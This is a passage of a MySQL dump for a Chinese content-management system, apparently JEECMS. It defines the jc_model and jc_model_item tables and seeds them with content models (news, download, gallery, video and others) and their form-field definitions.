  CONSTRAINT `fk_jc_message_user_send` FOREIGN KEY (`msg_send_user`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '站内信' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_model
-- ----------------------------
DROP TABLE IF EXISTS `jc_model`;
CREATE TABLE `jc_model`  (
  `model_id` int(11) NOT NULL,
  `model_name` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `model_path` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '路径',
  `tpl_channel_prefix` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '栏目模板前缀',
  `tpl_content_prefix` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容模板前缀',
  `title_img_width` int(11) NOT NULL DEFAULT 139 COMMENT '栏目标题图宽度',
  `title_img_height` int(11) NOT NULL DEFAULT 139 COMMENT '栏目标题图高度',
  `content_img_width` int(11) NOT NULL DEFAULT 310 COMMENT '栏目内容图宽度',
  `content_img_height` int(11) NOT NULL DEFAULT 310 COMMENT '栏目内容图高度',
  `priority` int(11) NOT NULL DEFAULT 10 COMMENT '排列顺序',
  `has_content` tinyint(1) NOT NULL DEFAULT 1 COMMENT '是否有内容',
  `is_disabled` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否禁用',
  `is_def` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否默认模型',
  `is_global` tinyint(1) NOT NULL DEFAULT 1 COMMENT '是否全站模型',
  `site_id` int(11) NULL DEFAULT NULL COMMENT '非全站模型所属站点',
  PRIMARY KEY (`model_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS模型表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_model
-- ----------------------------
INSERT INTO `jc_model` VALUES (1, '新闻', '1', 'news', 'news', 139, 139, 310, 310, 1, 1, 0, 1, 1, NULL);
INSERT INTO `jc_model` VALUES (2, '单页', '2', 'alone', 'alone', 139, 139, 310, 310, 2, 0, 0, 0, 1, NULL);
INSERT INTO `jc_model` VALUES (4, '下载', '4', 'download', 'download', 139, 139, 310, 310, 4, 1, 0, 0, 1, NULL);
INSERT INTO `jc_model` VALUES (5, '图库', '5', 'pic', 'pic', 139, 139, 310, 310, 5, 1, 0, 0, 1, NULL);
INSERT INTO `jc_model` VALUES (6, '视频', '6', 'video', 'video', 139, 139, 310, 310, 10, 1, 0, 0, 1, NULL);
INSERT INTO `jc_model` VALUES (8, '招聘', 'job', 'job', 'job', 139, 139, 310, 310, 10, 1, 0, 0, 1, NULL);
INSERT INTO `jc_model` VALUES (9, '面试模型', '/moudle', 'mszl', 'mszl', 139, 139, 310, 310, 10, 1, 0, 0, 1, NULL);

-- ----------------------------
-- Table structure for jc_model_item
-- ----------------------------
DROP TABLE IF EXISTS `jc_model_item`;
CREATE TABLE `jc_model_item`  (
  `modelitem_id` int(11) NOT NULL AUTO_INCREMENT,
  `model_id` int(11) NOT NULL,
  `field` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '字段',
  `item_label` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT 70 COMMENT '排列顺序',
  `def_value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '默认值',
  `opt_value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '可选项',
  `text_size` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '长度',
  `area_rows` varchar(3) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '文本行数',
  `area_cols` varchar(3) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '文本列数',
  `help` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '帮助信息',
  `help_position` varchar(1) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '帮助位置',
  `data_type` int(11) NOT NULL DEFAULT 1 COMMENT '数据类型',
  `is_single` tinyint(1) NOT NULL DEFAULT 1 COMMENT '是否独占一行',
  `is_channel` tinyint(1) NOT NULL DEFAULT 1 COMMENT '是否栏目模型项',
  `is_custom` tinyint(1) NOT NULL DEFAULT 1 COMMENT '是否自定义',
  `is_display` tinyint(1) NOT NULL DEFAULT 1 COMMENT '是否显示',
  `is_required` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否必填项',
  `image_width` int(11) NULL DEFAULT NULL COMMENT '图片宽度',
  `image_height` int(11) NULL DEFAULT NULL COMMENT '图片宽度',
  PRIMARY KEY (`modelitem_id`) USING BTREE,
  INDEX `fk_jc_item_model`(`model_id`) USING BTREE,
  CONSTRAINT `fk_jc_item_model` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 502 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS模型项表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_model_item
-- ----------------------------
INSERT INTO `jc_model_item` VALUES (1, 1, 'name', '栏目名称', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (2, 1, 'path', '访问路径', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (3, 1, 'title', 'meta标题', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (4, 1, 'keywords', 'meta关键字', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (5, 1, 'description', 'meta描述', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (6, 1, 'tplChannel', '栏目模板', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (7, 1, 'tplContent', '选择模型模板', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (8, 1, 'channelStatic', '栏目静态化', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (9, 1, 'contentStatic', '内容静态化', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (10, 1, 'priority', '排列顺序', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (11, 1, 'display', '显示', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (12, 1, 'docImg', '文档图片', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (14, 1, 'afterCheck', '审核后', 12, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (15, 1, 'commentControl', '评论', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (16, 1, 'allowUpdown', '顶踩', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (17, 1, 'viewGroupIds', '浏览权限', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 7, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (18, 1, 'contriGroupIds', '投稿权限', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 7, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (20, 1, 'link', '外部链接', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (21, 1, 'titleImg', '标题图', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (23, 1, 'title', '标题', 9, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (24, 1, 'shortTitle', '简短标题', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (25, 1, 'titleColor', '标题颜色', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (26, 1, 'tagStr', 'Tag标签', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (27, 1, 'description', '摘要', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (28, 1, 'author', '作者', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (29, 1, 'origin', '来源', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (30, 1, 'viewGroupIds', '浏览权限', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 7, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (31, 1, 'topLevel', '固顶级别', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (32, 1, 'releaseDate', '发布时间', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 5, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (33, 1, 'typeId', '内容类型', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (34, 1, 'tplContent', '指定模板', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (35, 1, 'typeImg', '类型图', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (36, 1, 'titleImg', '标题图', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (37, 1, 'contentImg', '内容图', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (38, 1, 'attachments', '附件', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (39, 1, 'media', '多媒体', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (40, 1, 'txt', '内容', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (42, 2, 'name', '栏目名称', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (43, 2, 'path', '访问路径', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (44, 2, 'title', 'meta标题', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (45, 2, 'keywords', 'meta关键字', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (46, 2, 'description', 'meta描述', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (47, 2, 'tplChannel', '栏目模板', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (48, 2, 'priority', '排列顺序', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (49, 2, 'display', '显示', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (51, 2, 'link', '外部链接', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (52, 2, 'contentImg', '内容图', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (53, 2, 'txt', '内容', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (93, 4, 'name', '栏目名称', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (94, 4, 'path', '访问路径', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (95, 4, 'title', 'meta标题', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (96, 4, 'keywords', 'meta关键字', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (97, 4, 'description', 'meta描述', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (98, 4, 'tplChannel', '栏目模板', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (99, 4, 'tplContent', '选择模型模板', 9, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (100, 4, 'priority', '排列顺序', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (101, 4, 'display', '显示', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (102, 4, 'docImg', '文档图片', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (103, 4, 'commentControl', '评论', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (104, 4, 'allowUpdown', '顶踩', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (105, 4, 'viewGroupIds', '浏览权限', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 7, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (107, 4, 'channelId', '栏目', 1, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 1, 0, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (108, 4, 'title', '软件名称', 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (109, 4, 'shortTitle', '软件简称', 3, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (110, 4, 'titleColor', '标题颜色', 4, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (111, 4, 'description', '摘要', 5, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (112, 4, 'author', '发布人', 6, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (113, 4, 'viewGroupIds', '浏览权限', 7, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 7, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (114, 4, 'topLevel', '固顶级别', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (115, 4, 'releaseDate', '发布时间', 9, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 5, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (116, 4, 'typeId', '内容类型', 9, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (117, 4, 'tplContent', '指定模板', 22, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (118, 4, 'contentImg', '内容图', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (119, 4, 'attachments', '资源上传', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (120, 4, 'txt', '软件介绍', 20, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (121, 4, 'softType', '软件类型', 12, '国产软件', '国产软件,国外软件', '100', '3', '30', NULL, NULL, 6, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (122, 4, 'warrant', '软件授权', 13, '免费版', '免费版,共享版', '', '3', '30', '', '', 6, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (123, 4, 'relatedLink', '相关链接', 14, 'http://', '', '50', '3', '30', '', '', 1, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (124, 4, 'demoUrl', '演示地址', 15, 'http://', NULL, '60', '3', '30', NULL, NULL, 1, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (125, 5, 'name', '栏目名称', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (126, 5, 'path', '访问路径', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (127, 5, 'title', 'meta标题', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (128, 5, 'keywords', 'meta关键字', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (129, 5, 'description', 'meta描述', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (130, 5, 'tplChannel', '栏目模板', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (131, 5, 'tplContent', '选择模型模板', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (132, 5, 'channelStatic', '栏目静态化', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (133, 5, 'contentStatic', '内容静态化', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (134, 5, 'priority', '排列顺序', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (135, 5, 'display', '显示', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (136, 5, 'docImg', '文档图片', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (138, 5, 'afterCheck', '审核后', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (139, 5, 'commentControl', '评论', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (140, 5, 'allowUpdown', '顶踩', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (141, 5, 'viewGroupIds', '浏览权限', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 7, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (142, 5, 'contriGroupIds', '投稿权限', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 7, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (144, 5, 'link', '外部链接', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (145, 5, 'titleImg', '标题图', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (146, 5, 'contentImg', '内容图', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (147, 5, 'channelId', '栏目', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 1, 0, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (148, 5, 'title', '标题', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (149, 5, 'shortTitle', '简短标题', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (150, 5, 'titleColor', '标题颜色', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (151, 5, 'tagStr', 'Tag标签', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (152, 5, 'description', '摘要', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (153, 5, 'author', '作者', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (154, 5, 'origin', '来源', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (155, 5, 'viewGroupIds', '浏览权限', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 7, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (156, 5, 'topLevel', '固顶级别', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (157, 5, 'releaseDate', '发布时间', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 5, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (158, 5, 'typeId', '内容类型', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (159, 5, 'tplContent', '指定模板', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (160, 5, 'typeImg', '类型图', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (161, 5, 'titleImg', '标题图', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (162, 5, 'contentImg', '内容图', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (163, 5, 'pictures', '图片集', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (164, 6, 'name', '栏目名称', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (165, 6, 'path', '访问路径', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (166, 6, 'title', 'meta标题', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (167, 6, 'keywords', 'meta关键字', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (168, 6, 'description', 'meta描述', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (169, 6, 'tplChannel', '栏目模板', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (170, 6, 'tplContent', '选择模型模板', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (171, 6, 'channelStatic', '栏目静态化', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (172, 6, 'contentStatic', '内容静态化', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (173, 6, 'priority', '排列顺序', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (174, 6, 'display', '显示', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (175, 6, 'docImg', '文档图片', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 1, 1, 0, 1, 0, NULL, NULL);
